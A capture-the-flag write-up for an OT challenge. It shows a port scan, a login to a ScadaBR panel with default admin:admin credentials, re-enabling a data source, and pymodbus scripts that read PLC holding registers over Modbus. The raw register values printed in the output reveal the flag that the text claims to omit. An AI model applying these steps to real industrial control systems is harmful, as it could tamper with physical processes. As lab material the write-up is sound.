# OT

```Description
_Flags have been omitted from this writeup per platform guidelines._

The Virelia facility’s legacy tank-control panel was marked “clean” during the remediation. But engineers still report inconsistent fill levels and sporadic valve toggling during non-operational hours.

After days of packet captures and flow analysis…nothing **u**ntil now.  
  
**Note:** The VM takes about **3 minutes** to boot up.
```

IP_Address 
```
10.10.254.64
```
Rustscan output 
```bash 
rustscan -a 10.10.254.64
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack
80/tcp   open  http        syn-ack
5020/tcp open  zenginkyo-1 syn-ack
5901/tcp open  vnc-1       syn-ack
8080/tcp open  http-proxy  syn-ack
```
then we surf on each port but while surfing on each port 
`PORT`  =  `80`, `5020`,  giving me 405 error and on port `5901` I got `RFB 003.008`
After this 
```bash 
curl -i http://10.10.254.64:8080 
HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/"236-1749599664000" Last-Modified: Tue, 10 Jun 2025 23:54:24 GMT Content-Type: text/html Content-Length: 236 Date: Sat, 28 Jun 2025 02:21:49 GMT <!DOCTYPE html> <html> <head> <title>ScadaBR CTF</title> <meta http-equiv="refresh" content="3; URL=/ScadaBR" /> </head> <body> <h1>Welcome to ScadaBR CTF</h1> <p>Redirecting you to <code>/ScadaBR</code>...</p> </body> </html>
```
Open in browser: `http://10.10.254.64:8080/ScadaBR` 
and Try Login Attempt with `admin : admin`
and Got  a `secret - test` which is comes with message 
`The point or its data source may be disabled.`
then 
```bash 
Data Sources → Find the one tied to “secret - test”
```
- Click **Edit**
- Check **Enabled** box (if it’s unchecked)
- Click **Save / Enable**
- Go back to the **Data Points** list and refresh **secret - test**

`secret                Modbus              IP                    plc:5020`

then These scripts comes handy thanks man `@H00DY`

Script from `Kunal aKa H00dy` 
```
from pymodbus.client import ModbusTcpClient

# Connect to the server
client = ModbusTcpClient('10.101.199.188', port=5020) 
client.connect()

# Read 20 holding registers starting from address 0
result = client.read_holding_registers(address=0, count=20)

if result.isError():
    print("❌ Error reading registers")
else:
    chars = [chr(val) for val in result.registers if val != 0]
    flag = ''.join(chars)
    print("🏁 Flag:", flag)

client.close()
```

```
My_Own_Script
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.10.254.64', port=5020)
client.connect()

result = client.read_holding_registers(address=0, count=20, unit=1)

if result.isError():
    print("❌ Error reading registers")
else:
    print("📦 Raw Registers:", result.registers)
    try:
        chars = [chr(val) for val in result.registers if 0 < val < 256]
        flag = ''.join(chars)
        print("🏁 Possible Flag:", flag)
    except Exception as e:
        print("❌ Decoding error:", e)

client.close()
```
and Then we got the Flag 
```bash 
python3 new.py
=æ Raw Registers: [84, 72, 77, 123, 109, 111, 100, 98, 117, 115, 95, 104, 105, 100, 125, 0, 0, 0, 0, 0]
<Á Possible Flag: [flag omitted]
```
Flag 
```flag 
[flag omitted]
```
